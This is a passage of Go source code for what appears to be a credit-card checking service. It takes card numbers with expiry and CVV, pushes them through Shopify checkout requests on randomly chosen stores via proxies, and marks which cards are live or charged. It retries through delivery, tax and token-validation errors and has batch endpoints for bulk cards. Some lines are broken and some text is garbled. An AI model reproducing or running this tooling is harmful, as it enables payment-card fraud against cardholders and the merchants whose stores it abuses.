                                fbStrat := deliveryStrategy
                                fbShip := shippingAmount
                                fbTax := taxAmount
                                if fbj := func() map[string]interface{} { var m map[string]interface{}; json.Unmarshal([]byte(fbShipTxt), &m); return m }(); fbj != nil {
                                        if sp := navMap(fbj, "data", "session", "negotiate", "result", "sellerProposal"); sp != nil {
                                                if dlLines := navSlice(sp, "delivery", "deliveryLines"); len(dlLines) > 0 {
                                                        if dlm := navMap(dlLines[0]); dlm != nil {
                                                                if avail := navSlice(dlm, "availableDeliveryStrategies"); len(avail) > 0 {
                                                                        if stm := navMap(avail[0]); stm != nil {
                                                                                if h := fmt.Sprintf("%v", stm["handle"]); h != "" && h != "<nil>" {
                                                                                        fbStrat = h
                                                                                }
                                                                                if amt := navMap(stm, "amount", "value"); amt != nil {
                                                                                        fbShip = fmt.Sprintf("%v", amt["amount"])
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                                if taxM := navMap(sp, "tax", "totalTaxAmount", "value"); taxM != nil {
                                                        fbTax = fmt.Sprintf("%v", taxM["amount"])
                                                }
                                        }
                                }
                                // Re-propose delivery with fallback address + fresh strategy
                                fbDelBody := deepCopyMap(fbShipBody)
                                if fv, ok := fbDelBody["variables"].(map[string]interface{}); ok {
                                        if fdel, ok := fv["delivery"].(map[string]interface{}); ok {
                                                if fdll, ok := fdel["deliveryLines"].([]interface{}); ok && len(fdll) > 0 {
                                                        if fdl, ok := fdll[0].(map[string]interface{}); ok {
                                                                fdl["selectedDeliveryStrategy"] = map[string]interface{}{
                                                                        "deliveryStrategyByHandle": map[string]interface{}{"handle": fbStrat, "customDeliveryRate": false},
                                                                        "options":                  map[string]interface{}{},
                                                                }
                                                                fdl["targetMerchandiseLines"] = map[string]interface{}{"lines": []interface{}{map[string]interface{}{"stableId": stableID}}}
                                                                fdl["expectedTotalPrice"] = map[string]interface{}{"value": map[string]interface{}{"amount": fbShip, "currencyCode": currency}}
                                                                fdl["destinationChanged"] = false
                                                        }
                                                }
                                        }
                                        if fp, ok := fv["payment"].(map[string]interface{}); ok {
                                                fp["billingAddress"] = map[string]interface{}{
                                                        "streetAddress": map[string]interface{}{
                                                                "address1": fbAddr.Address1, "address2": "", "city": fbAddr.City,
                                                                "countryCode": fbAddr.CountryCode, "postalCode": fbAddr.PostalCode,
                                                                "firstName": firstName, "lastName": lastName,
                                                                "zoneCode": fbAddr.ZoneCode, "phone": fbAddr.Phone,
                                                        },
                                                }
                                        }
                                        if bi, ok := fv["buyerIdentity"].(map[string]interface{}); ok {
                                                if cust, ok := bi["customer"].(map[string]interface{}); ok {
                                                        cust["countryCode"] = fbAddr.CountryCode
                                                }
                                                bi["phoneCountryCode"] = fbAddr.CountryCode
                                        }
                                }
                                doGQLRequest(client, gqlURL, map[string]string{"operationName": "Proposal"}, gqlHeaders, fbDelBody) //nolint
                                // Re-submit with fallback address
                                fbsv := deepCopyMap(submitVars)
                                if inp, ok := fbsv["input"].(map[string]interface{}); ok {
                                        if fDel, ok := inp["delivery"].(map[string]interface{}); ok {
                                                if fdLines, ok := fDel["deliveryLines"].([]interface{}); ok && len(fdLines) > 0 {
                                                        if fdl, ok := fdLines[0].(map[string]interface{}); ok {
                                                                fdl["selectedDeliveryStrategy"] = map[string]interface{}{
                                                                        "deliveryStrategyByHandle": map[string]interface{}{"handle": fbStrat, "customDeliveryRate": false},
                                                                        "options":                  map[string]interface{}{"phone": fbAddr.Phone},
                                                                }
                                                                fdl["expectedTotalPrice"] = map[string]interface{}{"any": true}
                                                                if dest, ok := fdl["destination"].(map[string]interface{}); ok {
                                                                        if sa, ok := dest["streetAddress"].(map[string]interface{}); ok {
                                                                                sa["address1"] = fbAddr.Address1
                                                                                sa["city"] = fbAddr.City
                                                                                sa["countryCode"] = fbAddr.CountryCode
                                                                                sa["postalCode"] = fbAddr.PostalCode
                                                                                sa["zoneCode"] = fbAddr.ZoneCode
                                                                                sa["phone"] = fbAddr.Phone
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                        if fPay, ok := inp["payment"].(map[string]interface{}); ok {
                                                if fPl, ok := fPay["paymentLines"].([]interface{}); ok && len(fPl) > 0 {
                                                        if fPlm, ok := fPl[0].(map[string]interface{}); ok {
                                                                if dpm, ok := fPlm["paymentMethod"].(map[string]interface{}); ok {
                                                                        if dcard, ok := dpm["directPaymentMethod"].(map[string]interface{}); ok {
                                                                                dcard["billingAddress"] = map[string]interface{}{
                                                                                        "streetAddress": map[string]interface{}{
                                                                                                "address1": fbAddr.Address1, "address2": "",
                                                                                                "city": fbAddr.City, "countryCode": fbAddr.CountryCode,
                                                                                                "postalCode": fbAddr.PostalCode, "firstName": firstName,
                                                                                                "lastName": lastName, "zoneCode": fbAddr.ZoneCode, "phone": fbAddr.Phone,
                                                                                        },
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                        if fTax, ok := inp["taxes"].(map[string]interface{}); ok {
                                                if pt, ok := fTax["proposedTotalAmount"].(map[string]interface{}); ok {
                                                        if v, ok := pt["value"].(map[string]interface{}); ok {
                                                                v["amount"] = fbTax
                                                        }
                                                }
                                        }
                                }
                                fbsd := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": fbsv, "operationName": "SubmitForCompletion"}
                                _, fbst, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, fbsd)
                                if fbst != "" {
                                        var fbj2 map[string]interface{}
                                        if json.Unmarshal([]byte(fbst), &fbj2) == nil {
                                                if fbr := navMap(fbj2, "data", "submitForCompletion"); fbr != nil {
                                                fbt := fmt.Sprintf("%v", fbr["__typename"])
                                                if fbt == "SubmitSuccess" || fbt == "SubmitAlreadyAccepted" || fbt == "SubmittedForCompletion" || fbt == "SubmitSuccessWithReceipt" {
                                                        return evalRetrySubmit(fbr, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                } else if fbt == "SubmitFailed" {
                                                        return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", fbr["reason"])), gateway, totalPrice, currency}
                                                } else if fbt == "SubmitRejected" {
                                                        fberrs := navSlice(fbr, "errors")
                                                                if len(fberrs) > 0 {
                                                                        if fbem, ok := fberrs[0].(map[string]interface{}); ok {
                                                                                fbc := fmt.Sprintf("%v", fbem["code"])
                                                                                fblm := fmt.Sprintf("%v", fbem["localizedMessage"])
                                                                                if fbc != "" && fbc != "<nil>" {
                                                                                        return CheckResult{false, sanitizeMsg(extractCleanResponse(fbc)), gateway, totalPrice, currency}
                                                                                }
                                                                                return CheckResult{false, sanitizeMsg(extractCleanResponse(fblm)), gateway, totalPrice, currency}
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                }
                                return CheckResult{false, "DELIVERY_ADDRESS", gateway, totalPrice, currency}
                        }

                        // â”€â”€ Retry 4: VALIDATION_CUSTOM â€” re-vault card then re-submit â”€â”€â”€â”€â”€â”€â”€
                        // A simple re-submit won't help; vault session may have expired or
                        // Shopify flagged this billing address. Re-vault â†’ fresh token â†’ retry.
                        // -- MISSING_CREDIT_CARD_SESSION_INFORMATION: re-vault and retry ---
                        isMissingSession := strings.Contains(combinedLower, "missing credit card session") ||
                                strings.Contains(combinedLower, "credit card session information")
                        if isMissingSession {
                                freshTok, freshErr := doVault()
                                if freshErr == nil && freshTok != "" {
                                        rvCopy2 := deepCopyMap(submitVars)
                                        if inp, ok := rvCopy2["input"].(map[string]interface{}); ok {
                                                if pay, ok := inp["payment"].(map[string]interface{}); ok {
                                                        if pls, ok := pay["paymentLines"].([]interface{}); ok && len(pls) > 0 {
                                                                if pl, ok := pls[0].(map[string]interface{}); ok {
                                                                        if pm, ok := pl["paymentMethod"].(map[string]interface{}); ok {
                                                                                if dpm, ok := pm["directPaymentMethod"].(map[string]interface{}); ok {
                                                                                        dpm["sessionId"] = freshTok
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                        rv2d := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": rvCopy2, "operationName": "SubmitForCompletion"}
                                        _, rv2t, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, rv2d)
                                        if rv2t != "" {
                                                var rv2j map[string]interface{}
                                                if json.Unmarshal([]byte(rv2t), &rv2j) == nil {
                                                        rv2sd := navMap(rv2j, "data", "submitForCompletion")
                                                        return evalRetrySubmit(rv2sd, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                }
                                        }
                                }
                        }

                        isCustomValidation := code == "VALIDATION_CUSTOM" ||
                                code == "PAYMENT_GATEWAY_VALIDATION_ERROR"

                        if isCustomValidation {
                                // Step A: re-vault the card to get a fresh PCI session token
                                freshToken, _ := doVault()

                                // Step B: build submit copy, patch fresh token if we got one
                                rvCopy := deepCopyMap(submitVars)
                                if freshToken != "" {
                                        if inp, ok := rvCopy["input"].(map[string]interface{}); ok {
                                                if pay, ok := inp["payment"].(map[string]interface{}); ok {
                                                        if pls, ok := pay["paymentLines"].([]interface{}); ok && len(pls) > 0 {
                                                                if pl, ok := pls[0].(map[string]interface{}); ok {
                                                                        if pm, ok := pl["paymentMethod"].(map[string]interface{}); ok {
                                                                                if dpm, ok := pm["directPaymentMethod"].(map[string]interface{}); ok {
                                                                                        dpm["sessionId"] = freshToken
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                }

                                rvd := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": rvCopy, "operationName": "SubmitForCompletion"}
                                _, rvt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, rvd)
                                if rvt != "" {
                                        var rvj map[string]interface{}
                                        if json.Unmarshal([]byte(rvt), &rvj) == nil {
                                                if rvr := navMap(rvj, "data", "submitForCompletion"); rvr != nil {
                                                rvt2 := fmt.Sprintf("%v", rvr["__typename"])
                                                if rvt2 == "SubmitSuccess" || rvt2 == "SubmitAlreadyAccepted" || rvt2 == "SubmittedForCompletion" || rvt2 == "SubmitSuccessWithReceipt" {
                                                        return evalRetrySubmit(rvr, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                } else if rvt2 == "SubmitFailed" {
                                                        return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", rvr["reason"])), gateway, totalPrice, currency}
                                                } else if rvt2 == "SubmitRejected" {
                                                        rverrs := navSlice(rvr, "errors")
                                                                if len(rverrs) > 0 {
                                                                        if rvem, ok := rverrs[0].(map[string]interface{}); ok {
                                                                                rvc := fmt.Sprintf("%v", rvem["code"])
                                                                                rvlm := fmt.Sprintf("%v", rvem["localizedMessage"])
                                                                                rvnlm := fmt.Sprintf("%v", rvem["nonLocalizedMessage"])
                                                                                if rvc != "" && rvc != "<nil>" && rvc != "VALIDATION_CUSTOM" {
                                                                                        return CheckResult{false, extractCleanResponse(rvc), gateway, totalPrice, currency}
                                                                                }
                                                                                if rvlm != "" && rvlm != "<nil>" {
                                                                                        return CheckResult{false, extractCleanResponse(rvlm), gateway, totalPrice, currency}
                                                                                }
                                                                                if rvnlm != "" && rvnlm != "<nil>" {
                                                                                        return CheckResult{false, extractCleanResponse(rvnlm), gateway, totalPrice, currency}
                                                                                }
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                }
                                return CheckResult{false, "VALIDATION_CUSTOM", gateway, totalPrice, currency}
                        }

                        // â”€â”€ Retry 5: new tax must be accepted â€” re-submit with updated tax amount â”€â”€
                        isTaxNew := code == "TAX_NEW_TAX_MUST_BE_ACCEPTED" ||
                                strings.Contains(combinedLower, "new tax") ||
                                strings.Contains(combinedLower, "tax must be accepted")

                        if isTaxNew {
                                // extract new tax total from sellerProposal inside the submit response
                                newTaxAmt := taxAmount
                                if sp := navMap(submitResult, "sellerProposal"); sp != nil {
                                        for _, k := range []string{"tax", "taxes"} {
                                                if tv := navMap(sp, k, "totalTaxAmount", "value"); tv != nil {
                                                        if a := fmt.Sprintf("%v", tv["amount"]); a != "" && a != "<nil>" {
                                                                newTaxAmt = a
                                                                break
                                                        }
                                                }
                                        }
                                }
                                // also try regex fallback on raw submit text
                                if newTaxAmt == taxAmount {
                                        if m := regexp.MustCompile(`"totalTaxAmount"[^}]{0,200}?"amount"\s*:\s*"([0-9]+\.[0-9]+)"`).FindStringSubmatch(submitText); len(m) > 1 {
                                                newTaxAmt = m[1]
                                        }
                                }
                                txCopy := deepCopyMap(submitVars)
                                if inp, ok := txCopy["input"].(map[string]interface{}); ok {
                                        if taxes, ok := inp["taxes"].(map[string]interface{}); ok {
                                                if pt, ok := taxes["proposedTotalAmount"].(map[string]interface{}); ok {
                                                        if v, ok := pt["value"].(map[string]interface{}); ok {
                                                                v["amount"] = newTaxAmt
                                                        }
                                                }
                                        }
                                }
                                txd := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": txCopy, "operationName": "SubmitForCompletion"}
                                _, txt2, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, txd)
                                if txt2 != "" {
                                        var txj map[string]interface{}
                                        if json.Unmarshal([]byte(txt2), &txj) == nil {
                                                if txr := navMap(txj, "data", "submitForCompletion"); txr != nil {
                                                txt3 := fmt.Sprintf("%v", txr["__typename"])
                                                if txt3 == "SubmitSuccess" || txt3 == "SubmitAlreadyAccepted" || txt3 == "SubmittedForCompletion" || txt3 == "SubmitSuccessWithReceipt" {
                                                        return evalRetrySubmit(txr, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                } else if txt3 == "SubmitFailed" {
                                                        return CheckResult{false, extractCleanResponse(fmt.Sprintf("%v", txr["reason"])), gateway, totalPrice, currency}
                                                } else if txt3 == "SubmitRejected" {
                                                        txerrs := navSlice(txr, "errors")
                                                                if len(txerrs) > 0 {
                                                                        if txem, ok := txerrs[0].(map[string]interface{}); ok {
                                                                                txc := fmt.Sprintf("%v", txem["code"])
                                                                                txlm := fmt.Sprintf("%v", txem["localizedMessage"])
                                                                                if txc != "" && txc != "<nil>" {
                                                                                        return CheckResult{false, sanitizeMsg(extractCleanResponse(txc)), gateway, totalPrice, currency}
                                                                                }
                                                                                return CheckResult{false, sanitizeMsg(extractCleanResponse(txlm)), gateway, totalPrice, currency}
                                                                        }
                                                                }
                                                        }
                                                }
                                        }
                                }
                                return CheckResult{false, "TAX_NEW_TAX_MUST_BE_ACCEPTED", gateway, totalPrice, currency}
                        }

                        // -- REQUIRED_ARTIFACTS_UNAVAILABLE: retry once, then fallback to physical product
                        isRequiredArtifacts := code == "REQUIRED_ARTIFACTS_UNAVAILABLE"
                        if isRequiredArtifacts {
                                if !requiresShipping && !triedDigital {
                                        // Retry same submit once after short delay
                                        time.Sleep(1 * time.Second)
                                        raCopy := deepCopyMap(submitVars)
                                        raData := map[string]interface{}{"id": opIDSubmitForCompletion, "variables": raCopy, "operationName": "SubmitForCompletion"}
                                        _, raTxt, _ := doGQLRequest(client, gqlURL, map[string]string{"operationName": "SubmitForCompletion"}, gqlHeaders, raData)
                                        if raTxt != "" {
                                                var raJ map[string]interface{}
                                                if json.Unmarshal([]byte(raTxt), &raJ) == nil {
                                                        if raR := navMap(raJ, "data", "submitForCompletion"); raR != nil {
                                                                raT := fmt.Sprintf("%v", raR["__typename"])
                                                                if raT == "SubmitSuccess" || raT == "SubmitAlreadyAccepted" || raT == "SubmittedForCompletion" || raT == "SubmitSuccessWithReceipt" {
                                                                        return evalRetrySubmit(raR, client, gqlURL, gqlHeaders, sst, gateway, totalPrice, currency)
                                                                }
                                                        }
                                                }
                                        }
                                        // Fallback: fetch a physical product and re-run full checkout
                                        physProd, physErr := fetchProductsPhysical(ourl, proxyStr)
                                        if physErr == nil && physProd != nil && physProd.VariantID != "" {
                                                return processCardFull(cc, mes, ano, cvv, siteURL, physProd, proxyStr, true)
                                        }
                                }
                                return CheckResult{false, "No delivery available (site ships locally only)", gateway, totalPrice, currency}
                        }

                        // collect first non-delivery, non-price code for final return
                        if firstCode == "" {
                                if code != "" {
                                        firstCode = code
                                } else if locMsg != "" && locMsg != "<nil>" {
                                        firstMsg = locMsg
                                }
                        }
                }
                if firstCode != "" {
                        return CheckResult{false, sanitizeMsg(extractCleanResponse(firstCode)), gateway, totalPrice, currency}
                }
                if firstMsg != "" {
                        return CheckResult{false, sanitizeMsg(extractCleanResponse(firstMsg)), gateway, totalPrice, currency}
                }
                return CheckResult{false, sanitizeMsg(extractCleanResponse(submitText)), gateway, totalPrice, currency}

        case "Throttled":
                return CheckResult{false, "THROTTLED", gateway, totalPrice, currency}

        default:
                return CheckResult{false, extractCleanResponse(submitText), gateway, totalPrice, currency}
        }
}

// JSON navigation helpers

func navMap(m interface{}, keys ...string) map[string]interface{} {
        cur, ok := m.(map[string]interface{})
        if !ok {
                return nil
        }
        for _, k := range keys {
                next, ok := cur[k]
                if !ok {
                        return nil
                }
                cur, ok = next.(map[string]interface{})
                if !ok {
                        return nil
                }
        }
        return cur
}

func navSlice(m interface{}, keys ...string) []interface{} {
        cur, ok := m.(map[string]interface{})
        if !ok {
                return nil
        }
        last := keys[len(keys)-1]
        for _, k := range keys[:len(keys)-1] {
                next, ok := cur[k]
                if !ok {
                        return nil
                }
                cur, ok = next.(map[string]interface{})
                if !ok {
                        return nil
                }
        }
        sl, _ := cur[last].([]interface{})
        return sl
}

func deepCopyMap(m map[string]interface{}) map[string]interface{} {
        b, _ := json.Marshal(m)
        var out map[string]interface{}
        json.Unmarshal(b, &out)
        return out
}

func min(a, b int) int {
        if a < b {
                return a
        }
        return b
}

// CC parser

type CCData struct {
        CC, Mes, Ano, CVV string
}

func parseCCString(s string) (CCData, error) {
        parts := strings.Split(strings.TrimSpace(s), "|")
        if len(parts) != 4 {
                return CCData{}, fmt.Errorf("invalid CC format ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â use: CC|MM|YYYY|CVV")
        }
        return CCData{
                CC:  strings.TrimSpace(parts[0]),
                Mes: strings.TrimSpace(parts[1]),
                Ano: strings.TrimSpace(parts[2]),
                CVV: strings.TrimSpace(parts[3]),
        }, nil
}

// BIN lookup helpers for API

var chargedResponses = map[string]bool{"ORDER_PLACED": true}
var approvedResponses = map[string]bool{
        "INSUFFICIENT_FUNDS": true,
        "INCORRECT_CVC":      true,
}

// HTTP API server

func loadSites() []string {
        f, err := os.Open("sites.txt")
        if err != nil {
                log.Println("[api] WARNING: sites.txt not found")
                return nil
        }
        defer f.Close()
        var out []string
        scanner := bufio.NewScanner(f)
        for scanner.Scan() {
                line := strings.TrimSpace(scanner.Text())
                if line == "" || strings.HasPrefix(line, "#") {
                        continue
                }
                if !strings.HasPrefix(line, "http") {
                        line = "https://" + line
                }
                out = append(out, line)
        }
        return out
}

// sitesSlice returns the cached sites slice via atomic load — no mutex, no allocation.
func sitesSlice() []string {
        v := sitesAtom.Load()
        if v == nil {
                return nil
        }
        return v.([]string)
}

// pickSite returns a random site from the atomic cache. Returns "" if empty.
func pickSite() string {
        s := sitesSlice()
        if len(s) == 0 {
                return ""
        }
        return s[rand.Intn(len(s))]
}

func jsonResp(w http.ResponseWriter, code int, v interface{}) {
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(code)
        json.NewEncoder(w).Encode(v)
}

// buildResult assembles the JSON-ready map from a CheckResult.
func buildResult(ccRaw string, res CheckResult, elapsed string) map[string]string {
        priceStr := res.Price
        if priceStr == "" || priceStr == "0.00" {
                priceStr = "?"
        }
        currStr := res.Currency
        if currStr == "" {
                currStr = "USD"
        }
        gateStr := res.Gateway
        if gateStr == "" {
                gateStr = "Shopify Payments"
        }
        isCharged := "False"
        isApproved := "False"
        if res.Response == "ORDER_PLACED" {
                isCharged = "True"
        } else if res.Success {
                // Bank was reached (FailedReceipt, ActionRequiredReceipt, messageUntranslated, etc.)
                // res.Success=true means Python returned True as first value = card is live
                isApproved = "True"
        }
        if approvedResponses[res.Response] {
                isApproved = "True"
        }
        displayResponse := res.Response
        if isCaptchaRequired(displayResponse) || genericCodes[strings.ToUpper(strings.TrimSpace(displayResponse))] {
                displayResponse = "CARD_DECLINED"
        }
        return map[string]string{
                "Response": displayResponse,
                "CC":       ccRaw,
                "Price":    priceStr + " " + currStr,
                "Gate":     gateStr,
                "Charged":  isCharged,
                "Approved": isApproved,
                "Time":     elapsed,
        }
}

func handleCheck(w http.ResponseWriter, r *http.Request) {

        // ── Concurrency gate: non-blocking acquire ───────────────────────────────
        // If all maxWorkers slots are busy, return 503 immediately.
        // Bot sees 503 -> record_error() -> routes CC to next node instead of waiting.
        select {
        case workerSem <- struct{}{}:
                defer func() { <-workerSem }()
        default:
                jsonResp(w, 503, map[string]string{"error": "at capacity"})
                return
        }
        activeWorkers.Add(1)
        defer activeWorkers.Add(-1)

        rawQS := r.URL.RawQuery
        var ccRaw, proxyStr string
        for _, part := range strings.Split(rawQS, "&") {
                if strings.HasPrefix(part, "proxy=") {
                        proxyStr, _ = url.QueryUnescape(part[len("proxy="):])
                } else if ccRaw == "" {
                        decoded, _ := url.QueryUnescape(part)
                        decoded = strings.TrimSpace(decoded)
                        // Strip any key= prefix: "cc=1234|12|25|999" -> "1234|12|25|999"
                        if eqIdx := strings.Index(decoded, "="); eqIdx != -1 {
                                pipeIdx := strings.Index(decoded, "|")
                                if pipeIdx < 0 || eqIdx < pipeIdx {
                                        decoded = decoded[eqIdx+1:]
                                }
                        }
                        if strings.Contains(decoded, "|") {
                                ccRaw = decoded
                        }
                }
        }

        if ccRaw == "" {
                jsonResp(w, 400, map[string]string{"error": "Missing CC. Use: /?CC|MM|YY|CVV&proxy=host:port:user:pass"})
                return
        }
        parsed, err := parseCCString(ccRaw)
        if err != nil {
                jsonResp(w, 400, map[string]string{"error": err.Error()})
                return
        }

        site := pickSite()
        if site == "" {
                jsonResp(w, 503, map[string]string{"error": "No sites loaded"})
                return
        }

        // ── Overall card deadline: 50s ────────────────────────────────────────────
        // Bot VPS timeout = 75s. We abort at 50s so Go returns a clean 504 response
        // well before the bot-side timeout fires. Prevents zombie goroutines from
        // holding workers past the point the bot has already given up.
        type cardResult struct {
                res  CheckResult
                site string
        }
        done := make(chan cardResult, 1)
        go func() {
                t := time.Now()
                _ = t
                var res CheckResult
                usedSite := site
                for attempt := 0; attempt <= maxRetries; attempt++ {
                        if attempt > 0 {
                                newSite := pickSite()
                                if newSite != "" && newSite != usedSite {
                                        usedSite = newSite
                                }
                                log.Printf("[retry] attempt=%d site=%s reason=%q", attempt, usedSite, res.Response)
                        }
                        res = processCard(parsed.CC, parsed.Mes, parsed.Ano, parsed.CVV, usedSite, proxyStr)
                        if !isRetryableResult(res.Response) {
                                break
                        }
                }
                done <- cardResult{res, usedSite}
        }()

        t0 := time.Now()
        select {
        case cr := <-done:
                elapsed := fmt.Sprintf("%.1fs", time.Since(t0).Seconds())
                result := buildResult(ccRaw, cr.res, elapsed)
                if result["Charged"] == "True" {
                        bin := binLookup(parsed.CC[:6])}
                jsonResp(w, 200, result)
        case <-time.After(60 * time.Second):
                // Increased from 50s to 60s — with maxWorkers=1000 the queue drains slower
                // under burst load, but each individual check still completes in ~10-25s.
                // Bot VPS timeout is 75s; 60s leaves comfortable margin.
                jsonResp(w, 504, map[string]string{"error": "card check timeout", "Response": "timeout", "Gate": "", "Charged": "False", "Approved": "False"})
        }
}

// isRetryableResult returns true when the response is a site/infra error
// that warrants trying a completely different store.
// Payment responses (declined, approved, OTP, etc.) are NOT retried.
func isRetryableResult(resp string) bool {
        // Definitive payment results — never retry
        finals := []string{
                "ORDER_PLACED", "CARD_DECLINED", "INSUFFICIENT_FUNDS",
                "EXPIRED_CARD", "WRONG_CVV", "OTP_REQUIRED",
                "INVALID_CARD", "DO_NOT_HONOR", "DECLINED",
                "INCORRECT_NUMBER", "INCORRECT_CVC",
        }
        up := strings.ToUpper(resp)
        for _, f := range finals {
                if strings.Contains(up, f) {
                        return false
                }
        }
        // Retryable infra/site errors
        retryable := []string{
                "SITE ERROR", "CART FAILED", "CART ADD", "TLS CLIENT", "TIMEOUT",
                "THROTTLED", "REQUEST FAILED", "NO PRODUCT", "NO SITES",
                "BOT_BLOCK", "GENERIC_ERROR", "CAPTCHA_REQUIRED",
                "INVALID JSON", "EMPTY RESPONSE", "HTML BLOCK",
                "HTTP 401", "HTTP 403", "HTTP 429", "HTTP 503",
                "VAULT", "DELIVERY", "PROXY",
                "SUBMIT FAILED", "SUBMIT REJECTED", "CHANGE PROXY",
                "NOFILE", "DIAL", "CONNECTION",
                "SESSION TOKEN", "FAILED TO GET SESSION",
                "COULDN'T COMPLETE", "COULD NOT COMPLETE",
                "CHECKOUT ERROR", "CHECKOUT:",
                "RATE LIMIT", "I/O TIMEOUT",
        }
        for _, r := range retryable {
                if strings.Contains(up, r) {
                        return true
                }
        }
        return false
}

// handleBatch: POST body = one CC per line (plain text, up to 64 MB).
// Streams NDJSON results back as each card finishes.
// ?proxy=host:port:user:pass
func handleBatch(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
                jsonResp(w, 405, map[string]string{"error": "POST only"})
                return
        }
        proxyStr, _ := url.QueryUnescape(r.URL.Query().Get("proxy"))
        r.Body = http.MaxBytesReader(w, r.Body, 64<<20)
        body, err := io.ReadAll(r.Body)
        if err != nil {
                jsonResp(w, 400, map[string]string{"error": "body read: " + err.Error()})
                return
        }
        var ccs []string
        for _, l := range strings.Split(string(body), "\n") {
                l = strings.TrimSpace(l)
                if l != "" && !strings.HasPrefix(l, "#") {
                        ccs = append(ccs, l)
                }
        }
        if len(ccs) == 0 {
                jsonResp(w, 400, map[string]string{"error": "No valid CCs in body"})
                return
        }

        w.Header().Set("Content-Type", "application/x-ndjson")
        w.Header().Set("X-Accel-Buffering", "no")
        w.WriteHeader(200)
        flusher, canFlush := w.(http.Flusher)

        // Cap goroutines per batch to avoid FD exhaustion.
        // Each card holds ~10 file descriptors; batchWorkers=20 → 200 FDs per batch, safe under 65535.
        concurrency := batchWorkers
        if concurrency > len(ccs) {
                concurrency = len(ccs)
        }
        pool := make(chan struct{}, concurrency)

        // results streams back to the writer as cards finish (NDJSON, arrival order)
        results := make(chan []byte, len(ccs))
        var wg sync.WaitGroup
        for _, ccRaw := range ccs {
                wg.Add(1)
                go func(ccLine string) {
                        defer wg.Done()
                        // Acquire batch pool slot — blocks until a slot is free
                        pool <- struct{}{}
                        defer func() { <-pool }()

                        parsed, err := parseCCString(ccLine)
                        if err != nil {
                                b, _ := json.Marshal(map[string]string{"CC": ccLine, "error": err.Error()})
                                results <- b
                                return
                        }
                        site := pickSite()
                        if site == "" {
                                b, _ := json.Marshal(map[string]string{"CC": ccLine, "error": "No sites"})
                                results <- b
                                return
                        }

                        t0 := time.Now()
                        usedSiteBatch := site
                        var res CheckResult
                        for attempt := 0; attempt <= maxRetries; attempt++ {
                                if attempt > 0 {
                                        ns := pickSite()
                                        if ns != "" && ns != usedSiteBatch {
                                                usedSiteBatch = ns
                                        }
                                }
                                res = processCard(parsed.CC, parsed.Mes, parsed.Ano, parsed.CVV, usedSiteBatch, proxyStr)
                                if !isRetryableResult(res.Response) {
                                        break
                                }
                        }
                        elapsed := fmt.Sprintf("%.1fs", time.Since(t0).Seconds())
                out := buildResult(ccLine, res, elapsed)
                        if out["Charged"] == "True" {
                                bin := binLookup(parsed.CC[:6])}
                        b, _ := json.Marshal(out)
                        results <- b
                }(ccRaw)
        }
        go func() { wg.Wait(); close(results) }()
        for line := range results {
                w.Write(line)
                w.Write([]byte("\n"))
                if canFlush {
                        flusher.Flush()
                }
        }
}

// handleHealth returns live stats.
func handleHealth(w http.ResponseWriter, r *http.Request) {
        sc := len(sitesSlice())
        jsonResp(w, 200, map[string]interface{}{
                "status":       "ok",
                "sites":        sc,
                "workers_cap":  maxWorkers,
                "workers_busy": int(activeWorkers.Load()),
        })
}

// handleStats returns system-level VPS stats for the /apivps command.
func handleStats(w http.ResponseWriter, r *http.Request) {
        sc := len(sitesSlice())

        // ── uptime ──────────────────────────────────────────────────────────────
        uptimeSec := int64(time.Since(apiStartTime).Seconds())

        // ── CPU cores ───────────────────────────────────────────────────────────
        cores := runtime.NumCPU()

        // ── load average (/proc/loadavg) ─────────────────────────────────────
        var load1, load5, load15 float64
        if raw, err := os.ReadFile("/proc/loadavg"); err == nil {
                fmt.Sscanf(string(raw), "%f %f %f", &load1, &load5, &load15)
        }
        cpuPct := 0.0
        if cores > 0 {
                cpuPct = load1 / float64(cores) * 100
                if cpuPct > 100 { cpuPct = 100 }
        }

        // ── RAM (/proc/meminfo) ──────────────────────────────────────────────
        var ramTotalKB, ramFreeKB, ramAvailKB int64
        if raw, err := os.ReadFile("/proc/meminfo"); err == nil {
                for _, line := range strings.SplitN(string(raw), "\n", 30) {
                        var key string; var val int64
                        fmt.Sscanf(line, "%s %d", &key, &val)
                        switch key {
                        case "MemTotal:":    ramTotalKB = val
                        case "MemFree:":     ramFreeKB  = val
                        case "MemAvailable:": ramAvailKB = val
                        }
                }
        }
        ramUsedKB := ramTotalKB - ramAvailKB
        if ramAvailKB == 0 { ramUsedKB = ramTotalKB - ramFreeKB }

        var diskUsedGB, diskTotalGB float64

        jsonResp(w, 200, map[string]interface{}{
                "cpu_pct":        math.Round(cpuPct*10) / 10,
                "cpu_cores":      cores,
                "ram_used_gb":    math.Round(float64(ramUsedKB)/1e6*100) / 100,
                "ram_total_gb":   math.Round(float64(ramTotalKB)/1e6*100) / 100,
                "ram_pct":        math.Round(float64(ramUsedKB)/float64(ramTotalKB)*1000) / 10,
                "disk_used_gb":   math.Round(diskUsedGB*100) / 100,
                "disk_total_gb":  math.Round(diskTotalGB*100) / 100,
